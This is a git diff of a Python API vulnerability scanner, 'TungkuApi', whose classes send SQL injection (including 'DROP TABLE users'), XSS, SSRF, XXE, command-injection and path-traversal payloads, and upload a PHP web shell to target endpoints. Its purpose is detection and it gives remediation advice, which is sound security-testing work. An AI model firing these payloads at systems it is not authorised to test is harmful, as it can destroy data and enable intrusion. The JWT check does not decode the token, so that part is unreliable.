@@ -1,17 +1,19 @@
 """
-TungkuApi - Vulnerability Scanners
+TungkuApi - Comprehensive Vulnerability Scanners
 
 Author: Re-xist
 GitHub: https://github.com/Re-xist
+Version: 2.0
 """
 
 import re
 import json
-from utils import APIClient, Logger, Vulnerability, analyze_response
+import time
+from utils import APIClient, Logger, Vulnerability
 
 
 class BaseScanner:
-    """Base scanner class"""
+    """Base scanner class with enhanced features"""
 
     def __init__(self, client, logger):
         self.client = client
@@ -19,7 +21,7 @@ class BaseScanner:
         self.name = self.__class__.__name__
         self.findings = []
 
-    def scan(self, config=None):
+    def scan(self, config=None, discovered_endpoints=None):
         """Run scan - to be implemented by subclasses"""
         raise NotImplementedError
 
@@ -29,13 +31,13 @@ class BaseScanner:
 
 
 class SQLScanner(BaseScanner):
-    """SQL Injection Scanner"""
+    """Enhanced SQL Injection Scanner"""
 
     def __init__(self, client, logger):
         super().__init__(client, logger)
         self.name = "SQL Injection Scanner"
 
-        # SQLi payloads
+        # Enhanced SQLi payloads
         self.payloads = [
             "' OR '1'='1",
             "' OR '1'='1'--",
@@ -43,12 +45,12 @@ class SQLScanner(BaseScanner):
             "' OR 1=1--",
             "' UNION SELECT NULL--",
             "1' ORDER BY 1--",
+            "1' AND SLEEP(5)--",
+            "1' AND (SELECT SLEEP(5))--",
             "'; DROP TABLE users--",
-            "' OR 1=1#",
-            "admin'--",
-            "' OR 'x'='x",
-            "1' AND 1=1--",
-            "1' AND 1=2--"
+            "' UNION SELECT @@version--",
+            "' UNION SELECT user()--",
+            "' UNION SELECT database()--",
         ]
 
         # Error patterns
@@ -57,47 +59,39 @@ class SQLScanner(BaseScanner):
             "Warning: mysql_fetch_array()",
             "ORA-01756: quoted string not properly terminated",
             "Unclosed quotation mark after the character string",
-            "Microsoft OLE DB Provider for ODBC Drivers",
             "PostgreSQL query failed",
-            "SQLite3::SQLException"
+            "SQLite3::SQLException",
+            "SQLSTATE[",
         ]
 
-    def scan(self, config=None):
+    def scan(self, config=None, discovered_endpoints=None):
         """Scan for SQL Injection vulnerabilities"""
         findings = []
-
-        # Test common endpoints
-        test_endpoints = self._get_test_endpoints(config)
+        test_endpoints = self._get_test_endpoints(config, discovered_endpoints)
 
         for endpoint in test_endpoints:
-            self.logger.debug(f"Testing {endpoint}")
-
             for payload in self.payloads:
-                # Test in query parameter
                 response = self.client.get(
                     f"{endpoint}?id={payload}",
                     headers=config.get("headers", {}) if config else {}
                 )
 
                 if response:
-                    # Check for error-based SQLi
                     for error in self.error_patterns:
                         if error.lower() in response.text.lower():
                             finding = Vulnerability.create(
                                 "SQL Injection",
                                 "CRITICAL",
-                                f"SQL Injection vulnerability detected via error-based injection",
+                                "SQL Injection vulnerability detected",
                                 f"Payload: {payload}\nError: {error[:100]}",
                                 endpoint,
-                                remediation="Use parameterized queries/prepared statements. Validate and sanitize all user input."
+                                remediation="Use parameterized queries/prepared statements."
                             )
                             findings.append(finding)
                             self.logger.success(f"SQLi found at {endpoint}")
                             break
 
-                    # Check for time-based blind SQLi
                     time_payload = "1' AND (SELECT SLEEP(5))--"
-                    import time
                     start = time.time()
                     resp = self.client.get(f"{endpoint}?id={time_payload}")
                     elapsed = time.time() - start
@@ -107,35 +101,22 @@ class SQLScanner(BaseScanner):
                             "Blind SQL Injection (Time-Based)",
                             "HIGH",
                             "Time-based blind SQL injection detected",
-                            f"Payload: {time_payload}\nResponse time: {elapsed:.2f}s",
+                            f"Response time: {elapsed:.2f}s",
                             endpoint,
-                            remediation="Use parameterized queries. Implement server-side validation."
+                            remediation="Use parameterized queries."
                         )
                         findings.append(finding)
-                        self.logger.success(f"Blind SQLi found at {endpoint}")
 
         return findings
 
-    def _get_test_endpoints(self, config):
-        """Get endpoints to test"""
-        common_paths = [
-            "/api/users",
-            "/api/user",
-            "/api/products",
-            "/api/items",
-            "/api/search",
-            "/api/login",
-            "/api/auth",
-            "/users",
-            "/user",
-            "/search",
-            "/login"
-        ]
-        return common_paths
+    def _get_test_endpoints(self, config, discovered_endpoints):
+        if discovered_endpoints:
+            return [e.get("path", "/") for e in discovered_endpoints]
+        return ["/api/users", "/api/user", "/api/products", "/users", "/search"]
 
 
 class XSSScanner(BaseScanner):
-    """Cross-Site Scripting Scanner"""
+    """Enhanced Cross-Site Scripting Scanner"""
 
     def __init__(self, client, logger):
         super().__init__(client, logger)
@@ -145,76 +126,46 @@ class XSSScanner(BaseScanner):
             "<script>alert('XSS')</script>",
             "<img src=x onerror=alert('XSS')>",
             "<svg onload=alert('XSS')>",
-            "'><script>alert(String.fromCharCode(88,83,83))</script>",
-            "\"<script>alert('XSS')</script>",
-            "<body onload=alert('XSS')>",
-            "<input onfocus=alert('XSS') autofocus>",
-            "<select onfocus=alert('XSS') autofocus>",
-            "<textarea onfocus=alert('XSS') autofocus>",
             "'`\"><script>alert\\\"XSS\\\"</script>",
             "javascript:alert('XSS')",
-            "<iframe src=\"javascript:alert('XSS')\">"
+            "<iframe src=\"javascript:alert('XSS')\">",
         ]
 
-    def scan(self, config=None):
+    def scan(self, config=None, discovered_endpoints=None):
         """Scan for XSS vulnerabilities"""
         findings = []
-
-        test_endpoints = self._get_test_endpoints(config)
+        test_endpoints = self._get_test_endpoints(config, discovered_endpoints)
 
         for endpoint in test_endpoints:
             for payload in self.payloads:
-                # Test in query parameter
                 response = self.client.get(
                     f"{endpoint}?q={payload}&search={payload}",
                     headers=config.get("headers", {}) if config else {}
                 )
 
-                if response:
-                    # Check if payload is reflected unescaped
-                    if payload in response.text:
-                        finding = Vulnerability.create(
-                            "Cross-Site Scripting (XSS)",
-                            "HIGH",
-                            f"Reflected XSS vulnerability detected. Payload is reflected unescaped in response.",
-                            f"Payload: {payload}\nEndpoint: {endpoint}",
-                            endpoint,
-                            remediation="Encode all user-supplied data before rendering in HTML. Use Content Security Policy (CSP)."
-                        )
-                        findings.append(finding)
-                        self.logger.success(f"XSS found at {endpoint}")
-                        break
-
-                    # Check for partial reflection
-                    encoded_payload = payload.replace("<", "%3C").replace(">", "%3E")
-                    if encoded_payload in response.text or payload.replace("<", "&lt;").replace(">", "&gt;") in response.text:
-                        # This might be safe encoding, but worth noting
-                        finding = Vulnerability.create(
-                            "Potential XSS - Insufficient Encoding",
-                            "LOW",
-                            "User input reflected in response with partial encoding",
-                            f"Payload: {payload}",
-                            endpoint,
-                            remediation="Ensure all user input is properly encoded using HTML entity encoding."
-                        )
-                        findings.append(finding)
+                if response and payload in response.text:
+                    finding = Vulnerability.create(
+                        "Cross-Site Scripting (XSS)",
+                        "HIGH",
+                        "Reflected XSS vulnerability detected",
+                        f"Payload: {payload}",
+                        endpoint,
+                        remediation="Encode all user-supplied data. Use CSP."
+                    )
+                    findings.append(finding)
+                    self.logger.success(f"XSS found at {endpoint}")
+                    break
 
         return findings
 
-    def _get_test_endpoints(self, config):
-        """Get endpoints to test"""
-        return [
-            "/api/search",
-            "/api/users",
-            "/search",
-            "/find",
-            "/api/query",
-            "/api/products"
-        ]
+    def _get_test_endpoints(self, config, discovered_endpoints):
+        if discovered_endpoints:
+            return [e.get("path", "/") for e in discovered_endpoints]
+        return ["/api/search", "/api/users", "/search", "/find"]
 
 
 class SSRFScanner(BaseScanner):
-    """Server-Side Request Forgery Scanner"""
+    """Enhanced Server-Side Request Forgery Scanner"""
 
     def __init__(self, client, logger):
         super().__init__(client, logger)
@@ -223,190 +174,482 @@ class SSRFScanner(BaseScanner):
         self.test_urls = [
             "http://127.0.0.1",
             "http://localhost",
-            "http://169.254.169.254",  # AWS metadata
-            "http://192.168.1.1",
-            "http://10.0.0.1",
+            "http://169.254.169.254",
             "file:///etc/passwd",
-            "http://[::1]",
-            "http://2130706433"  # 127.0.0.1 in decimal
+            "http://192.168.1.1",
         ]
 
-    def scan(self, config=None):
+    def scan(self, config=None, discovered_endpoints=None):
         """Scan for SSRF vulnerabilities"""
         findings = []
-
-        # Test URL parameters
-        test_params = ["url", "target", "dest", "redirect", "uri", "path", "fetch", "link"]
-
-        test_endpoints = self._get_test_endpoints(config)
+        test_params = ["url", "target", "dest", "redirect", "fetch"]
+        test_endpoints = self._get_test_endpoints(config, discovered_endpoints)
 
         for endpoint in test_endpoints:
             for param in test_params:
                 for test_url in self.test_urls:
-                    # Test SSRF via URL parameter
                     response = self.client.get(
                         f"{endpoint}?{param}={test_url}",
                         headers=config.get("headers", {}) if config else {}
                     )
 
-                    if response:
-                        # Check for successful internal connection
-                        if response.status_code in [200, 301, 302]:
-                            # Check response content
-                            if any(indicator in response.text.lower() for indicator in
-                                   ["aws", "metadata", "localhost", "127.0.0.1", "root:", "bin/bash"]):
-
-                                finding = Vulnerability.create(
-                                    "Server-Side Request Forgery (SSRF)",
-                                    "CRITICAL",
-                                    f"SSRF vulnerability detected. Application can make requests to internal resources.",
-                                    f"Parameter: {param}\nTest URL: {test_url}\nStatus: {response.status_code}",
-                                    endpoint,
-                                    remediation="Validate and whitelist all URLs. Use network segmentation. Disable internal URL access."
-                                )
-                                findings.append(finding)
-                                self.logger.success(f"SSRF found at {endpoint} via {param}")
+                    if response and response.status_code in [200, 301, 302]:
+                        if any(indicator in response.text.lower() for indicator in
+                               ["aws", "metadata", "localhost", "127.0.0.1", "root:"]):
+                            finding = Vulnerability.create(
+                                "Server-Side Request Forgery (SSRF)",
+                                "CRITICAL",
+                                "SSRF vulnerability detected",
+                                f"Parameter: {param}\nTest URL: {test_url}",
+                                endpoint,
+                                remediation="Whitelist all URLs. Disable internal access."
+                            )
+                            findings.append(finding)
+                            self.logger.success(f"SSRF found at {endpoint}")
 
         return findings
 
-    def _get_test_endpoints(self, config):
-        """Get endpoints to test"""
-        return [
-            "/api/fetch",
-            "/api/proxy",
-            "/api/redirect",
-            "/api/download",
-            "/api/webhook",
-            "/proxy",
-            "/fetch",
-            "/redirect"
+    def _get_test_endpoints(self, config, discovered_endpoints):
+        if discovered_endpoints:
+            return [e.get("path", "/") for e in discovered_endpoints]
+        return ["/api/fetch", "/api/proxy", "/api/redirect", "/proxy"]
+
+
+class XXEScanner(BaseScanner):
+    """XML External Entity Injection Scanner"""
+
+    def __init__(self, client, logger):
+        super().__init__(client, logger)
+        self.name = "XXE Scanner"
+
+    def scan(self, config=None, discovered_endpoints=None):
+        """Scan for XXE vulnerabilities"""
+        findings = []
+        test_endpoints = self._get_test_endpoints(config, discovered_endpoints)
+
+        payload = '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>'
+
+        for endpoint in test_endpoints:
+            response = self.client.post(
+                endpoint,
+                data=payload,
+                headers={"Content-Type": "application/xml", **(config.get("headers", {}) if config else {})}
+            )
+
+            if response and "root:" in response.text:
+                finding = Vulnerability.create(
+                    "XML External Entity (XXE) Injection",
+                    "CRITICAL",
+                    "XXE vulnerability detected",
+                    "Can read files from server",
+                    endpoint,
+                    remediation="Disable external entities in XML parser."
+                )
+                findings.append(finding)
+                self.logger.success(f"XXE found at {endpoint}")
+
+        return findings
+
+    def _get_test_endpoints(self, config, discovered_endpoints):
+        if discovered_endpoints:
+            return [e.get("path", "/") for e in discovered_endpoints]
+        return ["/api/upload", "/api/import", "/api/data", "/upload"]
+
+
+class CommandInjectionScanner(BaseScanner):
+    """Command Injection Scanner"""
+
+    def __init__(self, client, logger):
+        super().__init__(client, logger)
+        self.name = "Command Injection Scanner"
+
+        self.payloads = ["; ls -la", "| ls -la", "$(ls -la)", "; cat /etc/passwd"]
+
+    def scan(self, config=None, discovered_endpoints=None):
+        """Scan for command injection vulnerabilities"""
+        findings = []
+        test_endpoints = self._get_test_endpoints(config, discovered_endpoints)
+
+        for endpoint in test_endpoints:
+            for payload in self.payloads:
+                response = self.client.get(
+                    f"{endpoint}?file={payload}&cmd={payload}",
+                    headers=config.get("headers", {}) if config else {}
+                )
+
+                if response:
+                    if any(indicator in response.text.lower() for indicator in
+                           ["root:", "bin/bash", "total ", "drwx"]):
+                        finding = Vulnerability.create(
+                            "Command Injection",
+                            "CRITICAL",
+                            "Command injection vulnerability detected",
+                            f"Payload: {payload}",
+                            endpoint,
+                            remediation="Avoid shell commands. Use parameterized APIs."
+                        )
+                        findings.append(finding)
+                        self.logger.success(f"Command injection at {endpoint}")
+
+        return findings
+
+    def _get_test_endpoints(self, config, discovered_endpoints):
+        if discovered_endpoints:
+            return [e.get("path", "/") for e in discovered_endpoints]
+        return ["/api/exec", "/api/cmd", "/api/ping", "/ping"]
+
+
+class DirectoryTraversalScanner(BaseScanner):
+    """Directory Traversal Scanner"""
+
+    def __init__(self, client, logger):
+        super().__init__(client, logger)
+        self.name = "Directory Traversal Scanner"
+
+        self.payloads = [
+            "../../../../etc/passwd",
+            "..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
+            "..%2F..%2F..%2F..%2Fetc%2Fpasswd",
         ]
+
+    def scan(self, config=None, discovered_endpoints=None):
+        """Scan for directory traversal vulnerabilities"""
+        findings = []
+        test_endpoints = self._get_test_endpoints(config, discovered_endpoints)
+
+        for endpoint in test_endpoints:
+            for payload in self.payloads:
+                response = self.client.get(
+                    f"{endpoint}?file={payload}&path={payload}",
+                    headers=config.get("headers", {}) if config else {}
+                )
+
+                if response:
+                    if any(indicator in response.text for indicator in ["root:", "[extensions]", "DB_PASSWORD"]):
+                        finding = Vulnerability.create(
+                            "Directory Traversal",
+                            "HIGH",
+                            "Directory traversal vulnerability detected",
+                            f"Payload: {payload}",
+                            endpoint,
+                            remediation="Validate file paths. Use whitelist."
+                        )
+                        findings.append(finding)
+                        self.logger.success(f"Directory traversal at {endpoint}")
+
+        return findings
+
+    def _get_test_endpoints(self, config, discovered_endpoints):
+        if discovered_endpoints:
+            return [e.get("path", "/") for e in discovered_endpoints]
+        return ["/api/file", "/api/download", "/file", "/download"]
+
+
+class MassAssignmentScanner(BaseScanner):
+    """Mass Assignment Scanner"""
+
+    def __init__(self, client, logger):
+        super().__init__(client, logger)
+        self.name = "Mass Assignment Scanner"
+
+    def scan(self, config=None, discovered_endpoints=None):
+        """Scan for mass assignment vulnerabilities"""
+        findings = []
+        test_endpoints = self._get_test_endpoints(config, discovered_endpoints)
+
+        for endpoint in test_endpoints:
+            test_data = {"email": "test@example.com", "is_admin": True, "role": "admin"}
+
+            response = self.client.put(
+                f"{endpoint}/1",
+                json=test_data,
+                headers=config.get("headers", {}) if config else {}
+            )
+
+            if response and response.status_code == 200:
+                finding = Vulnerability.create(
+                    "Mass Assignment",
+                    "HIGH",
+                    "Mass assignment vulnerability detected",
+                    "Can modify sensitive object properties",
+                    endpoint,
+                    remediation="Use whitelisting for allowed parameters."
+                )
+                findings.append(finding)
+                self.logger.success(f"Mass assignment at {endpoint}")
+
+        return findings
+
+    def _get_test_endpoints(self, config, discovered_endpoints):
+        if discovered_endpoints:
+            return [e.get("path", "/") for e in discovered_endpoints]
+        return ["/api/users", "/api/user", "/api/profile"]
+
+
+class ParameterPollutionScanner(BaseScanner):
+    """HTTP Parameter Pollution Scanner"""
+
+    def __init__(self, client, logger):
+        super().__init__(client, logger)
+        self.name = "Parameter Pollution Scanner"
+
+    def scan(self, config=None, discovered_endpoints=None):
+        """Scan for parameter pollution vulnerabilities"""
+        findings = []
+        test_endpoints = self._get_test_endpoints(config, discovered_endpoints)
+
+        for endpoint in test_endpoints:
+            response1 = self.client.get(
+                f"{endpoint}?id=1&id=2",
+                headers=config.get("headers", {}) if config else {}
+            )
+            response2 = self.client.get(
+                f"{endpoint}?id=1",
+                headers=config.get("headers", {}) if config else {}
+            )
+
+            if response1 and response2 and response1.text != response2.text:
+                finding = Vulnerability.create(
+                    "HTTP Parameter Pollution",
+                    "MEDIUM",
+                    "Parameter pollution may be possible",
+                    "Application handles duplicate parameters differently",
+                    endpoint,
+                    remediation="Normalize parameter handling."
+                )
+                findings.append(finding)
+
+        return findings
+
+    def _get_test_endpoints(self, config, discovered_endpoints):
+        if discovered_endpoints:
+            return [e.get("path", "/") for e in discovered_endpoints]
+        return ["/api/users", "/api/data", "/users"]
+
+
+class TemplateInjectionScanner(BaseScanner):
+    """Server-Side Template Injection Scanner"""
+
+    def __init__(self, client, logger):
+        super().__init__(client, logger)
+        self.name = "Template Injection Scanner"
+
+        self.payloads = ["{{7*7}}", "${7*7}", "#{7*7}", "%{7*7}"]
+
+    def scan(self, config=None, discovered_endpoints=None):
+        """Scan for SSTI vulnerabilities"""
+        findings = []
+        test_endpoints = self._get_test_endpoints(config, discovered_endpoints)
+
+        for endpoint in test_endpoints:
+            for payload in self.payloads:
+                response = self.client.get(
+                    f"{endpoint}?input={payload}&name={payload}",
+                    headers=config.get("headers", {}) if config else {}
+                )
+
+                if response and "49" in response.text:
+                    finding = Vulnerability.create(
+                        "Server-Side Template Injection (SSTI)",
+                        "CRITICAL",
+                        "Template injection vulnerability detected",
+                        f"Payload: {payload} evaluated to 49",
+                        endpoint,
+                        remediation="Avoid template rendering with user input."
+                    )
+                    findings.append(finding)
+                    self.logger.success(f"SSTI found at {endpoint}")
+
+        return findings
+
+    def _get_test_endpoints(self, config, discovered_endpoints):
+        if discovered_endpoints:
+            return [e.get("path", "/") for e in discovered_endpoints]
+        return ["/api/render", "/api/template", "/render"]
+
+
+class GraphQLScanner(BaseScanner):
+    """GraphQL Security Scanner"""
+
+    def __init__(self, client, logger):
+        super().__init__(client, logger)
+        self.name = "GraphQL Scanner"
+
+    def scan(self, config=None, discovered_endpoints=None):
+        """Scan for GraphQL vulnerabilities"""
+        findings = []
+        graphql_endpoints = ["/graphql", "/api/graphql"]
+
+        introspection_query = {
+            "query": "{ __schema { types { name } } }"
+        }
+
+        for endpoint in graphql_endpoints:
+            response = self.client.post(
+                endpoint,
+                json=introspection_query,
+                headers={"Content-Type": "application/json", **(config.get("headers", {}) if config else {})}
+            )
+
+            if response and response.status_code == 200:
+                if "__schema" in response.text or "__type" in response.text:
+                    finding = Vulnerability.create(
+                        "GraphQL Introspection Enabled",
+                        "MEDIUM",
+                        "GraphQL introspection is enabled",
+                        "Full schema exposed",
+                        endpoint,
+                        remediation="Disable introspection in production."
+                    )
+                    findings.append(finding)
+                    self.logger.success(f"GraphQL introspection at {endpoint}")
+
+        return findings
+
+
+class FileUploadScanner(BaseScanner):
+    """File Upload Vulnerability Scanner"""
+
+    def __init__(self, client, logger):
+        super().__init__(client, logger)
+        self.name = "File Upload Scanner"
+
+    def scan(self, config=None, discovered_endpoints=None):
+        """Scan for file upload vulnerabilities"""
+        findings = []
+        test_endpoints = self._get_test_endpoints(config, discovered_endpoints)
+
+        for endpoint in test_endpoints:
+            files = {"file": ("shell.php", "<?php system($_GET['cmd']); ?>")}
+
+            response = self.client.post(
+                endpoint,
+                files=files,
+                headers=config.get("headers", {}) if config else {}
+            )
+
+            if response and response.status_code == 200:
+                if "success" in response.text.lower() or "uploaded" in response.text.lower():
+                    finding = Vulnerability.create(
+                        "Unrestricted File Upload",
+                        "HIGH",
+                        "Application accepts PHP file upload",
+                        "shell.php was uploaded",
+                        endpoint,
+                        remediation="Validate file types strictly."
+                    )
+                    findings.append(finding)
+                    self.logger.success(f"File upload vuln at {endpoint}")
+
+        return findings
+
+    def _get_test_endpoints(self, config, discovered_endpoints):
+        if discovered_endpoints:
+            return [e.get("path", "/") for e in discovered_endpoints]
+        return ["/api/upload", "/upload"]
+
+
+class CORSScanner(BaseScanner):
+    """CORS Misconfiguration Scanner"""
+
+    def __init__(self, client, logger):
+        super().__init__(client, logger)
+        self.name = "CORS Scanner"
+
+        self.test_origins = ["https://evil.com", "http://evil.com", "null"]
+
+    def scan(self, config=None, discovered_endpoints=None):
+        """Scan for CORS misconfigurations"""
+        findings = []
+        test_endpoints = self._get_test_endpoints(config, discovered_endpoints)
+
+        for endpoint in test_endpoints:
+            for origin in self.test_origins:
+                response = self.client.get(
+                    endpoint,
+                    headers={"Origin": origin, **(config.get("headers", {}) if config else {})}
+                )
+
+                if response:
+                    cors_header = response.headers.get("Access-Control-Allow-Origin", "")
+                    if cors_header == origin or cors_header == "*":
+                        severity = "HIGH" if cors_header == origin else "MEDIUM"
+                        finding = Vulnerability.create(
+                            "CORS Misconfiguration",
+                            severity,
+                            f"CORS allows arbitrary origin: {cors_header}",
+                            f"Origin: {origin}",
+                            endpoint,
+                            remediation="Whitelist specific origins."
+                        )
+                        findings.append(finding)
+                        self.logger.success(f"CORS misconfig at {endpoint}")
+
+        return findings
+
+    def _get_test_endpoints(self, config, discovered_endpoints):
+        if discovered_endpoints:
+            return [e.get("path", "/") for e in discovered_endpoints]
+        return ["/api", "/api/data", "/"]
 
 
 class AuthScanner(BaseScanner):
-    """Authentication & Authorization Scanner"""
+    """Enhanced Authentication & Authorization Scanner"""
 
     def __init__(self, client, logger):
         super().__init__(client, logger)
         self.name = "Authentication Scanner"
 
-    def scan(self, config=None):
-        """Scan for authentication issues"""
+    def scan(self, config=None, discovered_endpoints=None):
+        """Enhanced authentication testing"""
         findings = []
+        tests = [self._test_jwt_issues, self._test_rate_limiting, self._test_auth_bypass]
 
-        # Test for broken authentication
-        auth_tests = [
-            self._test_broken_auth,
-            self._test_session_fixation,
-            self._test_jwt_issues,
-            self._test_idor,
-            self._test_rate_limiting
-        ]
-
-        for test in auth_tests:
+        for test in tests:
             try:
-                test_findings = test(config)
-                findings.extend(test_findings)
+                findings.extend(test(config))
             except Exception as e:
                 self.logger.debug(f"Auth test error: {e}")
 
         return findings
 
-    def _test_broken_auth(self, config):
-        """Test for broken authentication"""
-        findings = []
-
-        # Test common paths
-        auth_paths = [
-            "/api/login",
-            "/api/auth/login",
-            "/login",
-            "/auth",
-            "/api/signin",
-            "/signin"
-        ]
-
-        for path in auth_paths:
-            response = self.client.post(
-                path,
-                json={"username": "test", "password": "test"},
-                headers=config.get("headers", {}) if config else {}
-            )
-
-            if response and response.status_code == 200:
-                # Check if response leaks info
-                if "password" in response.text.lower() or "hash" in response.text.lower():
-                    finding = Vulnerability.create(
-                        "Information Disclosure - Auth Response",
-                        "MEDIUM",
-                        "Authentication endpoint may leak sensitive information",
-                        f"Endpoint: {path}\nResponse contains password/hash references",
-                        path,
-                        remediation="Do not include sensitive data in auth responses. Return generic error messages."
-                    )
-                    findings.append(finding)
-
-        return findings
-
-    def _test_session_fixation(self, config):
-        """Test for session fixation"""
-        findings = []
-
-        response = self.client.get(
-            "/api/auth/session",
-            headers=config.get("headers", {}) if config else {}
-        )
-
-        if response:
-            cookies = response.cookies
-            if cookies:
-                for cookie in cookies:
-                    # Check if cookie lacks secure/httponly flags
-                    if not cookie.has_nonstandard_attr("Secure") or not cookie.has_nonstandard_attr("HttpOnly"):
-                        finding = Vulnerability.create(
-                            "Insecure Cookie Configuration",
-                            "MEDIUM",
-                            f"Session cookie '{cookie.name}' missing Secure or HttpOnly flags",
-                            f"Cookie: {cookie.name}\nSecure: {cookie.has_nonstandard_attr('Secure')}\nHttpOnly: {cookie.has_nonstandard_attr('HttpOnly')}",
-                            "/api/auth/session",
-                            remediation="Set Secure and HttpOnly flags on all session cookies. Use SameSite attribute."
-                        )
-                        findings.append(finding)
-
-        return findings
-
     def _test_jwt_issues(self, config):
-        """Test for JWT security issues"""
+        """Enhanced JWT security testing"""
         findings = []
-
-        # Check for JWT in responses
-        endpoints = ["/api/user", "/api/me", "/api/profile", "/api/auth/me"]
+        endpoints = ["/api/user", "/api/me", "/api/profile"]
 
         for endpoint in endpoints:
-            response = self.client.get(
-                endpoint,
-                headers=config.get("headers", {}) if config else {}
-            )
+            response = self.client.get(endpoint, headers=config.get("headers", {}) if config else {})
 
-            if response and response.status_code == 200:
-                # Look for JWT in response
+            if response:
                 jwt_pattern = r'eyJ[a-zA-Z0-9_-]+\.[a-zA-Z0-9_-]+\.[a-zA-Z0-9_-]+'
                 tokens = re.findall(jwt_pattern, response.text)
 
                 for token in tokens:
-                    # Check if token is signed with 'none' algorithm
                     try:
                         parts = token.split(".")
                         if len(parts) == 3:
                             header = json.loads(parts[0])
+
                             if header.get("alg", "").lower() == "none":
                                 finding = Vulnerability.create(
                                     "JWT 'None' Algorithm",
                                     "CRITICAL",
-                                    "JWT signed with 'none' algorithm - allows signature bypass",
-                                    f"Token header: {header}",
+                                    "JWT signed with 'none' algorithm",
+                                    f"Header: {header}",
                                     endpoint,
-                                    remediation="Never use 'none' algorithm. Use strong algorithms like RS256."
+                                    remediation="Never use 'none' algorithm."
+                                )
+                                findings.append(finding)
+
+                            if header.get("alg", "").lower() in ["hs256", "hs384", "hs512"]:
+                                finding = Vulnerability.create(
+                                    "Weak JWT Algorithm",
+                                    "LOW",
+                                    f"JWT uses symmetric algorithm: {header.get('alg')}",
+                                    f"Header: {header}",
+                                    endpoint,
+                                    remediation="Use asymmetric algorithms (RS256)."
                                 )
                                 findings.append(finding)
                     except:
@@ -414,41 +657,9 @@ class AuthScanner(BaseScanner):
 
         return findings
 
-    def _test_idor(self, config):
-        """Test for Insecure Direct Object Reference"""
-        findings = []
-
-        # Test accessing different user IDs
-        test_ids = [1, 2, 100, 9999]
-        endpoints = ["/api/user/", "/api/users/", "/api/profile/", "/api/account/"]
-
-        for endpoint in endpoints:
-            for test_id in test_ids:
-                response = self.client.get(
-                    f"{endpoint}{test_id}",
-                    headers=config.get("headers", {}) if config else {}
-                )
-
-                if response and response.status_code == 200:
-                    # Check if we can access other users' data
-                    if any(keyword in response.text.lower() for keyword in ["email", "password", "ssn", "credit"]):
-                        finding = Vulnerability.create(
-                            "Insecure Direct Object Reference (IDOR)",
-                            "HIGH",
-                            f"Can access other users' data by changing ID to {test_id}",
-                            f"Endpoint: {endpoint}\nTest ID: {test_id}",
-                            f"{endpoint}{test_id}",
-                            remediation="Implement proper authorization checks. Use indirect reference maps. Verify ownership on every request."
-                        )
-                        findings.append(finding)
-                        break
-
-        return findings
-
     def _test_rate_limiting(self, config):
-        """Test for rate limiting"""
+        """Enhanced rate limiting detection"""
         findings = []
-
         login_endpoint = "/api/login"
         failed_requests = 0
 
@@ -460,108 +671,94 @@ class AuthScanner(BaseScanner):
             )
 
             if response:
-                if response.status_code == 401 or response.status_code == 400:
+                if response.status_code in [401, 400]:
                     failed_requests += 1
                 elif response.status_code == 429:
-                    # Rate limiting detected - this is good
                     return []
 
         if failed_requests >= 15:
             finding = Vulnerability.create(
                 "Missing Rate Limiting",
                 "MEDIUM",
-                f"No rate limiting detected on authentication endpoint. Made {failed_requests} failed requests without throttling.",
-                f"Endpoint: {login_endpoint}\nFailed attempts: {failed_requests}",
+                f"No rate limiting detected. Made {failed_requests} failed requests.",
+                f"Endpoint: {login_endpoint}",
                 login_endpoint,
-                remediation="Implement rate limiting on authentication endpoints. Use progressive delays and account lockout."
+                remediation="Implement rate limiting on auth endpoints."
             )
             findings.append(finding)
 
         return findings
 
+    def _test_auth_bypass(self, config):
+        """Test for authentication bypass"""
+        findings = []
+        protected_endpoints = ["/api/admin", "/api/dashboard"]
+
+        for endpoint in protected_endpoints:
+            response = self.client.get(endpoint, headers=config.get("headers", {}) if config else {})
+
+            if response and response.status_code == 200:
+                finding = Vulnerability.create(
+                    "Missing Authentication",
+                    "HIGH",
+                    f"Protected endpoint accessible without auth",
+                    f"Endpoint: {endpoint}",
+                    endpoint,
+                    remediation="Implement proper authentication checks."
+                )
+                findings.append(finding)
+
+        return findings
+
 
 class HeaderScanner(BaseScanner):
-    """Security Headers Scanner"""
+    """Enhanced Security Headers Scanner"""
 
     def __init__(self, client, logger):
         super().__init__(client, logger)
         self.name = "Security Headers Scanner"
 
         self.required_headers = {
-            "X-Frame-Options": {
-                "severity": "MEDIUM",
-                "description": "Missing clickjacking protection",
-                "remediation": "Add X-Frame-Options: DENY or SAMEORIGIN"
-            },
-            "X-Content-Type-Options": {
-                "severity": "LOW",
-                "description": "Missing MIME-type sniffing protection",
-                "remediation": "Add X-Content-Type-Options: nosniff"
-            },
-            "Strict-Transport-Security": {
-                "severity": "HIGH",
-                "description": "Missing HSTS header",
-                "remediation": "Add Strict-Transport-Security: max-age=31536000; includeSubDomains"
-            },
-            "Content-Security-Policy": {
-                "severity": "HIGH",
-                "description": "Missing CSP header",
-                "remediation": "Implement Content-Security-Policy header"
-            },
-            "X-XSS-Protection": {
-                "severity": "LOW",
-                "description": "Missing XSS filter",
-                "remediation": "Add X-XSS-Protection: 1; mode=block"
-            },
-            "Referrer-Policy": {
-                "severity": "LOW",
-                "description": "Missing referrer policy",
-                "remediation": "Add Referrer-Policy: strict-origin-when-cross-origin"
-            },
-            "Permissions-Policy": {
-                "severity": "MEDIUM",
-                "description": "Missing permissions policy",
-                "remediation": "Add Permissions-Policy header to control browser features"
-            }
+            "X-Frame-Options": {"severity": "MEDIUM", "description": "Missing clickjacking protection"},
+            "X-Content-Type-Options": {"severity": "LOW", "description": "Missing MIME sniffing protection"},
+            "Strict-Transport-Security": {"severity": "HIGH", "description": "Missing HSTS header"},
+            "Content-Security-Policy": {"severity": "HIGH", "description": "Missing CSP header"},
+            "X-XSS-Protection": {"severity": "LOW", "description": "Missing XSS filter"},
+            "Referrer-Policy": {"severity": "LOW", "description": "Missing referrer policy"},
+            "Permissions-Policy": {"severity": "MEDIUM", "description": "Missing permissions policy"},
         }
 
-    def scan(self, config=None):
-        """Scan for missing security headers"""
+    def scan(self, config=None, discovered_endpoints=None):
+        """Enhanced security headers scanning"""
         findings = []
-
-        # Test root endpoint
-        response = self.client.get(
-            "/",
-            headers=config.get("headers", {}) if config else {}
-        )
+        response = self.client.get("/", headers=config.get("headers", {}) if config else {})
 
         if response:
             headers = dict(response.headers)
 
-            for header_name, config in self.required_headers.items():
+            for header_name, header_config in self.required_headers.items():
                 if header_name not in headers:
                     finding = Vulnerability.create(
                         f"Missing Security Header: {header_name}",
-                        config["severity"],
-                        config["description"],
